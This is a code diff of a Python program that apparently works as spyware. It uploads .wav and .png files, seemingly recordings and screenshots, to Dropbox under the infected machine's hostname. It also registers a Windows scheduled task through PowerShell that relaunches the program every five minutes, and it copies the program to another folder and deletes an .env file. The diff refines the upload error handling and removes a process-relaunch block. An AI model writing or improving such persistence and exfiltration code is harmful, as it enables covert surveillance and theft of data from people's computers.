@@ -1,3 +1,4 @@
+import dropbox
 import os
 import shutil
 import smtplib
@@ -77,20 +78,25 @@ def remove_env_file():
             os.remove(env_file)
 
 
-def upload_to_dropbox(hostname, dbx, wav_and_png_files):
+def upload_to_dropbox(hostname, dbx, wav_and_png_files, dest_folder):
     for file_name in wav_and_png_files:
-        file_path = os.path.join(os.getcwd(), file_name)
+        file_path = os.path.join(dest_folder, file_name)
         destination_path = f"/{hostname}_{file_name}"
 
         try:
             with open(file_path, "rb") as f:
                 dbx.files_upload(f.read(), destination_path)
-        except (dbx.exceptions.ApiError, FileNotFoundError, Exception):
+        except (dropbox.exceptions.ApiError, FileNotFoundError, Exception) as e:
+            print(f"Error: {e}")
             return
+
+
+import subprocess
 
 
 def create_scheduled_task(executable_path, task_name):
     check_task_command = f'if (Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue) {{ exit 1 }} else {{ exit 0 }}'
+
     task_exists = subprocess.run(
         ["powershell", "-Command", check_task_command], capture_output=True, text=True
     )
@@ -104,13 +110,6 @@ def create_scheduled_task(executable_path, task_name):
         Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "{task_name}" -Description "Esegue il processo custom ogni 5 minuti"
         """
         subprocess.run(["powershell", "-Command", create_task_command], check=True)
-
-        check_process_command = f"""
-        if (-not (Get-Process -Name 'main' -ErrorAction SilentlyContinue)) {{
-            Start-Process '{executable_path}'
-        }}
-        """
-        subprocess.run(["powershell", "-Command", check_process_command], check=True)
 
 
 def save_program_in_location(src_file, dest_folder):
